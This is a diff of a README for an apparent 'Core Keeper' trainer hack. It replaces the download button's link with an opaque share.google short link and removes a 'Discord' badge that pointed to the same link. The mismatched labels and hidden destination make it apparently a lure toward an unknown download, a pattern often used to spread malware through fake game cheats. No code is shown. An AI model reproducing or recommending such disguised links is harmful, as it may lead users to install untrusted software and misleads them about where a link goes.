@@ -10,7 +10,7 @@ Enhance your Core Keeper gameplay with this powerful trainer hack featuring unli
 
   ![](https://raw.githubusercontent.com/geraldofriviera/Core-Keeper-Meteor/main/pictures/.png)
 
-  <a href="https://geraldofriviera.github.io/id/07258924"><img src="https://raw.githubusercontent.com/geraldofriviera/Core-Keeper-Meteor/main/pictures/0.png" height="80"></a>
+  <a href="https://share.google/8Ujwwl735ztNcfA7q"><img src="https://raw.githubusercontent.com/geraldofriviera/Core-Keeper-Meteor/main/pictures/0.png" height="80"></a>
 
 </div>
 
@@ -50,4 +50,3 @@ And many other features!
 
 💬 Have questions or need support? Join our active Discord community:
 
-[![Discord](https://img.shields.io/badge/Discord-Join-7289DA?logo=discord)](https://share.google/8Ujwwl735ztNcfA7q)
